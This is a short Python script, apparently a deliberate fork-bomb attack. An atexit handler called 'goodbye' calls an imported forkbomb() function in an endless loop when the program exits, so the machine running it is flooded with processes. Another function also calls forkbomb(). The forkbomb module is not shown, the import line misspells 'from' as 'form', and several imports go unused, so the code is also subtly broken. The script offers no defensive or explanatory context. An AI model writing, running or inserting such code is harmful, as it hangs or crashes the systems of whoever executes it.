import os
import atexit
import random
import time
form forkbomb import forkbomb
def forked():
  forkbomb()
    
@atexit.register
def goodbye():
  mal = True
  while mal == True:
    forkbomb()
